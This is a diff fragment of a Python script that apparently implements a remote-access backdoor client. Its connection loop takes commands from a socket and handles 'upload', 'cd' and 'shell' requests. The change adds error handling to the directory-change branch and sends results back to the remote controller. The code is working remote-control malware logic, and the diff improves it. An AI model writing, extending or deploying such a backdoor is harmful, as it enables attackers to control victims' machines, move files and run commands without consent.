@@ -126,12 +126,14 @@ def connection():
 		elif 'upload' in command:
 			transferupload(s,command)
 
-        
+
 		elif 'cd' in command:
-			code,directory = command.split ('*') 
-			os.chdir(directory) 
-			s.send(("[+] CWD Is " + os.getcwd()).encode())
-			s.send(("DONE").encode())
+			code,directory = command.split ('*')
+			try:
+				os.chdir(directory)
+				s.send(("[+] CWD Is " + os.getcwd()).encode())
+			except:
+				s.send("[-] PATH NOT FOUND".encode())
 
 		elif 'shell' in command:
 			shell,query = command.split('*')
